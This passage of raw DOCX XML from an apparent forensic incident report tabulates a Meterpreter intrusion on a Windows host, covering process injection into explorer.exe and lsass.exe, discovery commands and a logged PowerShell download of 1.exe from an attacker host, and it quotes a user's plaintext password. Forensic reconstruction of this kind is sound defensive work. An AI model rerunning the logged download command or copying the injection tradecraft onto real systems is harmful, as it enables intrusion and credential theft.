            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:03:09</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>execution</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Payloads\pscp.exe executed, spawns and injects explorer.exe (PID 7324)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Sysmon 1 pscp.exe PID 2196 {e6e9f951-0ded-654e-8f01-000000000500} from powershell 1088; Sysmon 1 explorer.exe 7324 {e6e9f951-0ded-654e-9001-000000000500}; Sysmon 8 remote thread pscp→explorer.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T1055 T1036.005</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18650</w:t>
              <w:br/>
              <w:t>evtxecmd/evtxecmd_0.csv#18651</w:t>
              <w:br/>
              <w:t>evtxecmd/evtxecmd_0.csv#18652</w:t>
              <w:br/>
              <w:t>pecmd/prefetch_0.csv#98</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:03:09</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>defense evasion</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pscp.exe → explorer.exe 7324 CreateRemoteThread (process migration) – corroborated by Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Sysmon 1 RecordRow 18650: C:\Payloads\pscp.exe PID 2196 GUID {e6e9f951-0ded-654e-8f01-000000000500} (MD5 DED9E58DD95A88A4BEE89B74A65F05F1). Sysmon 1 row 18651 (11:03:09.989): explorer.exe PID 7324 GUID {e6e9f951-0ded-654e-9001-000000000500}, ParentImage C:\Payloads\pscp.exe. Sysmon 8 row 18652 (11:03:09.990): pscp.exe 2196 CreateRemoteThread into explorer 7324, StartAddress 0xB30000. Prefetch PSCP.EXE-1DCA12FC last run 11:03:09.900 (run count 1) — matches Sysmon to the 10 ms, no clock skew between sources.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T1055 T1036.005</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18651</w:t>
              <w:br/>
              <w:t>evtxecmd/evtxecmd_0.csv#18652</w:t>
              <w:br/>
              <w:t>pecmd/prefetch_0.csv#98</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:03:56</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>credential access</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Injected explorer.exe creates remote thread in lsass.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Sysmon 8 source explorer 7324 → lsass.exe 648, StartAddress 0x0000028F43080000.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T1055 T1003.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18654</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:04:13</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>discovery</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Discovery via cmd.exe child of injected explorer: tracert, quser, later tasklist</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>cmd 6600 → tracert -h / -m 6 8.8.8.8 / -h 6 8.8.8.8 (11:04:39–11:05:12), quser 11:05:41; cmd 5848 → tasklist 11:11:23.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T1016 T1033 T1057</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18655</w:t>
              <w:br/>
              <w:t>evtxecmd/evtxecmd_0.csv#18659</w:t>
              <w:br/>
              <w:t>evtxecmd/evtxecmd_0.csv#18682</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:04:39</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>discovery</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch/SRUM corroboration of Meterpreter discovery binaries (tracert x3, quser, tasklist, netstat, whoami, net1)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch: TRACERT.EXE-EC2ABA23 runs=3 (11:04:39, 11:05:01, 11:05:12), QUSER.EXE runs=1 11:05:41, TASKLIST.EXE runs=1 11:11:23, NETSTAT.EXE runs=1 11:12:23, WHOAMI.EXE runs=1 11:13:25, NET1.EXE runs=1 11:13:35. SRUM AppTimeline intervals 11:06–11:14 for the same binaries. Matches Sysmon 1 children of cmd 6600/5848 (parents injected explorer 7324).</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T1016 T1033 T1057 T1049 T1087.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#196</w:t>
              <w:br/>
              <w:t>pecmd/prefetch_0.csv#99</w:t>
              <w:br/>
              <w:t>pecmd/prefetch_0.csv#193</w:t>
              <w:br/>
              <w:t>pecmd/prefetch_0.csv#83</w:t>
              <w:br/>
              <w:t>pecmd/prefetch_0.csv#217</w:t>
              <w:br/>
              <w:t>pecmd/prefetch_0.csv#82</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:06:40</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>execution</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Meterpreter PowerShell extension loaded in explorer.exe (HostName=MSFConsole)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>PowerShell 400/600 HostApplication=explorer.exe HostName=MSFConsole; 4104 IEX base64 bootstrap, Invoke-DcSync* functions.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T1059.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#28055</w:t>
              <w:br/>
              <w:t>evtxecmd/evtxecmd_0.csv#8744</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:10:55</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>command and control</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>1.exe downloaded from http://10.0.0.12:8080/1.exe by powershell (child of injected explorer chain)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>4104 'wget http://10.0.0.12:8080/1.exe -o 1.exe'; Sysmon 11 C:\Users\medmondson\1.exe; Sysmon 3 → 10.0.0.12:8080.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T1105</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#8814</w:t>
              <w:br/>
              <w:t>evtxecmd/evtxecmd_0.csv#18680</w:t>
              <w:br/>
              <w:t>evtxecmd/evtxecmd_0.csv#18681</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:12:23</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>discovery</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Discovery via cmd 5848: netstat -ntb, whoami /user (11:13:25), net user administrator (11:13:35)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Sysmon 1 children of cmd.exe GUID {e6e9f951-0f52-654e-ad01-000000000500} (child of injected explorer 7324); corroborated by Prefetch NETSTAT/WHOAMI/NET/NET1 run count 1.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T1049 T1033 T1087.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18688</w:t>
              <w:br/>
              <w:t>evtxecmd/evtxecmd_0.csv#18694</w:t>
              <w:br/>
              <w:t>evtxecmd/evtxecmd_0.csv#18695</w:t>
              <w:br/>
              <w:t>pecmd/prefetch_0.csv#83</w:t>
              <w:br/>
              <w:t>pecmd/prefetch_0.csv#217</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:35</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>discovery</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>net1.exe enumerates local Administrator account (Security 4798)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>4798 target Administrator (RID 500), SubjectLogonId 0x15347, caller C:\Windows\System32\net1.exe PID 0x480 – corroborates 'net user administrator' from Meterpreter cmd 5848.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T1087.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#27065</w:t>
              <w:br/>
              <w:t>evtxecmd/evtxecmd_0.csv#18696</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:56</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>credential exposure</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Plaintext credential file Desktop\not_my_pass.txt saved by user Notepad (PID 932) during active Meterpreter session</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Notepad 932 (parent user explorer 2432, LogonId 0x153A9) Save As not_my_pass.txt (38 B, content 'user: medmondson pass: password123!@#' per SIDR). OpenSavePidlMRU/LastVisited/RecentDocs/LNK/JumpList at 11:13:56. $SI LastAccess 11:15:54 (unattributed).</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T1552.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261019151050/recmd_kroll_C_OpenSavePidlMRU.csv#2</w:t>
              <w:br/>
              <w:t>mftecmd_mft/mft.csv#112639</w:t>
              <w:br/>
              <w:t>sidr/DESKTOP-KJ81A5A_File_Report_20261019_151100.037119200.csv#1215</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:16:03</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>execution</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Last observed activity of the injected explorer.exe 7324 (CLR usage log write)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Sysmon 11 row 19241: explorer.exe PID 7324 GUID {e6e9f951-0ded-654e-9001-000000000500} writes C:\Users\medmondson\AppData\Local\Microsoft\CLR_v4.0\UsageLogs\explorer.exe.log (CLR loaded inside the injected process, consistent with the Meterpreter PowerShell/.NET extension). SRUM AppTimeline: pscp.exe interval ending 11:17:00, duration ~120 s. No Sysmon 5 termination is logged for 2196/7324 (config). Last attacker-attributable event in the dataset; after this only analyst activity (KAPE/tools from 11:21 UTC).</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T1055 T1059.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#19241</w:t>
              <w:br/>
              <w:t>srumecmd/20261019151050_SrumECmd_AppTimelineProvider_Output.csv#949</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Detailed evidence timeline</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>All the evidence cited by the findings and the timeline, sorted by time.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="center"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1814"/>
        <w:gridCol w:w="1984"/>
        <w:gridCol w:w="5669"/>
        <w:gridCol w:w="2438"/>
        <w:gridCol w:w="2551"/>
        <w:gridCol w:w="1020"/>
      </w:tblGrid>
      <w:tr>
        <w:trPr>
          <w:tblHeader w:val="true"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Timestamp (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Artifact</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Detail</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Reference</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Original source</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Cited by</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>raw.reg_networkadapters</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
